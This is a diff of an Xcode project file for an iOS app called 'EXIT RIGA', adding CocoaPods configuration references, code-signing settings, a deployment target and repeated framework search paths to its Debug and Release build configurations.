@@ -433,18 +688,35 @@
 		};
 		52655D1A261C1D470040B007 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 2FBD5F8DD797D6064B0F9A0F /* Pods-EXIT RIGA.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 694HCLG65X;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
+				);
 				INFOPLIST_FILE = "EXIT RIGA/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGA";
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -452,18 +724,35 @@
 		};
 		52655D1B261C1D470040B007 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = EB66B32BDF55E7EDF22C5453 /* Pods-EXIT RIGA.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
+				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
 				DEVELOPMENT_TEAM = 694HCLG65X;
+				FRAMEWORK_SEARCH_PATHS = (
+					"$(inherited)",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
+					"$(PROJECT_DIR)/EXIT\\ RIGA/Resources/dynamic",
+				);
 				INFOPLIST_FILE = "EXIT RIGA/Info.plist";
+				IPHONEOS_DEPLOYMENT_TARGET = 11.4;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = "com.EXIT-RIGA";
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
